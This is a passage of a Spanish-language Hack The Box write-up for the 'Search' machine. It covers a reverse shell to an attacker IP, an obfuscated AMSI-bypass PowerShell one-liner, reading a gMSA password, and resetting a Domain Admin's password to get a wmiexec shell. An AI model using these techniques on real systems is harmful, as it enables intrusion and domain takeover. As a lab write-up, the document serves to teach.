1g 0:00:01:12 DONE (2023-02-04 17:11) 0.01371g/s 75244p/s 75244c/s 75244C/s misssnail..missnona16
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Ahora puedo importarlos sin problema

<img src="/writeups/assets/img/Search-htb/16.png" alt="">

Como un certificado se llama staff.pfx, pruebo a introducir esa ruta, y efectivamente existe por SSL. Me pide que proporcione el certificado

<img src="/writeups/assets/img/Search-htb/17.png" alt="">

Puedo obtener una PowerShell proporcionando las credenciales

<img src="/writeups/assets/img/Search-htb/18.png" alt="">

Me mando una reverse shell a la consola para trabajar más comodamente

```null
cat Invoke-ConPtyShell.ps1 | tail -n 1
Invoke-ConPtyShell -RemoteIp 10.10.16.2 -RemotePort 443 -Rows 55 -Cols 209
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Pero me bloquea el AMSI

<img src="/writeups/assets/img/Search-htb/19.png" alt="">

Para burlarlo, fuerzo un error para que la tarea se corrompa y puedo ejecutar lo que quiera. En caso de no obfuscarlo, también lo bloquea

```null
PS C:\Users\Sierra.Frye\Documents> 

$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
```

Gano acceso en mi equipo

```null
PS C:\Windows\system32> whoami
search\sierra.frye
PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::20e
   IPv6 Address. . . . . . . . . . . : dead:beef::307d:3e26:2292:b7a2
   Link-local IPv6 Address . . . . . : fe80::307d:3e26:2292:b7a2%6
   IPv4 Address. . . . . . . . . . . : 10.10.11.129
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2a8a%6
                                       10.10.10.2
```

Puedo visualizar la primera flag

```null
PS C:\Users\Sierra.Frye\Desktop> type user.txt
64879e289376d725df7bb6e96893d0b8 
```

# Escalada

Vuelvo al esquema de ataque que vi antes

<img src="/writeups/assets/img/Search-htb/20.png" alt="">

Tengo la capacidad de ReadGMSAPassword sobre un Account System. En una máquina Windows, me clono el repositorio de [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) para compilarlo y subirlo a la máquina víctima

Ejecuto y obtengo la GMSAPassword

```null
PS C:\Temp> .\GMSAPasswordReader.exe --accountname bir-adfs-gmsa --domainname search.htb
Calculating hashes for Current Value
[*] Input username             : BIR-ADFS-GMSA$
[*] Input domain               : SEARCH.HTB
[*] Salt                       : SEARCH.HTBBIR-ADFS-GMSA$
[*]       rc4_hmac             : E1E9FD9E46D0D747E1595167EEDCEC0F
[*]       aes128_cts_hmac_sha1 : BBCD2446765F390C680CDA31A9FC1783
[*]       aes256_cts_hmac_sha1 : ECAED51920F8677C5846154F69267FE4875543727C7032690016F7947A8A6F94
[*]       des_cbc_md5          : 3843029E088FB983
```

También se puede directamente desde Powershell, sin tener que subir ningún binario ni importar ningún script

```null
PS C:\Temp> $gmsa = Get-ADServiceAccount -Identity 'bir-adfs-gmsa' -Properties 'msDS-ManagedPassword'
PS C:\Temp> $mp = $gmsa.'msDS-ManagedPassword'
PS C:\Temp> $pass = ConvertFrom-ADManagedPasswordBlob $mp
PS C:\Temp> ConvertTo-NTHash -Password $pass.SecureCurrentPassword 
e1e9fd9e46d0d747e1595167eedcec0f 
```

Como ese Account System tiene GenericAll sobre un usuario Administrador del Dominio, puedo modificar sus atributos y, por tanto, cambiarle su contraseña para conectarme por SMB con psexec

No es del todo necesario tenerla en texto claro, ya que si de primeras la tengo en formato SecureString, luego no la tengo que volver a pasar y me ahorro tiempo

```null
PS C:\Temp> ConvertFrom-ADManagedPasswordBlob $mp


Version                   : 1
CurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤ᒛ䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙 
竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇
SecureCurrentPassword     : System.Security.SecureString
PreviousPassword          :
SecurePreviousPassword    :
QueryPasswordInterval     : 2618.05:59:58.2636401
UnchangedPasswordInterval : 2618.05:54:58.2636401
```

Y puedo ejecutar comandos con el uso de ScriptBlocks

```null
PS C:\Temp> $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
PS C:\Temp> $cred = New-Object System.Management.Automation.PSCredential('search.htb\bir-adfs-gmsa',$SecPass)
PS C:\Temp> Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
search\bir-adfs-gmsa$ 
```

Le cambio la contraseña al usuario tristan.davies

```null
PS C:\Temp> Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { net user tristan.davies pwned123 }
The command completed successfully.
```

Valido con crackmapexec que todo ha salido correctamente

```null
crackmapexec smb 10.10.11.129 -u 'tristan.davies' -p 'pwned123'
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\tristan.davies:pwned123 (Pwn3d!)
```

Psexec se queda pillado a la hora de entablar la conexión por algún motivo que desconozco

```null
psexec.py search.htb/tristan.davies:pwned123@10.10.11.129
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.11.129.....
[*] Found writable share ADMIN$
[*] Uploading file gjbbrjYk.exe
[*] Opening SVCManager on 10.10.11.129.....
[*] Creating service VfZl on 10.10.11.129.....
[*] Starting service VfZl.....
```

Utilizo wmiexec que es una herramienta alternativa

```null
wmiexec.py search.htb/tristan.davies:pwned123@10.10.11.129
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
search\tristan.davies
```

Y puedo visualizar la segunda flag

```null
C:\Users\Administrator\Desktop>type root.txt
4d3cd85cc8faba99366402775b709eca
```